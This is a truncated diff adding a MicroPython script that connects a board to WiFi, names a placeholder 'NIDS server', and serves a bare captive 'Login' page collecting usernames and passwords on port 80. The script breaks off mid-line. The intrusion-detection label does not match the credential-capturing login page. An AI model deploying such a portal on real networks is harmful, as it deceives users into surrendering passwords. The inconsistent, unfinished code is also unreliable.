@@ -1,0 +1,49 @@
+import network
+import utime
+import ubinascii
+import uhashlib
+import urequests
+import usocket
+
+# Set the WiFi parameters
+WIFI_SSID = "your_wifi_ssid"
+WIFI_PASSWORD = "your_wifi_password"
+
+# Set the NIDS server URL
+NIDS_SERVER = "http://your_nids_server.com/intrusion"
+
+# Connect to the WiFi network
+wifi = network.WLAN(network.STA_IF)
+wifi.active(True)
+wifi.connect(WIFI_SSID, WIFI_PASSWORD)
+
+# Wait for the WiFi connection to be established
+while not wifi.isconnected():
+    utime.sleep(1)
+
+# Set up the captive web page
+html = """
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <form method="post">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <input type="submit" value="Submit">
+    </form> 
+</body>
+</html>
+"""
+
+# Set up the HTTP server
+s = usocket.socket(usocket.AF_INET, usocket.SOCK_STREAM)
+s.bind(("", 80))
+s.listen(5)
+
+# Wait for incoming connections
+while True:
+    conn, addr = s.accept
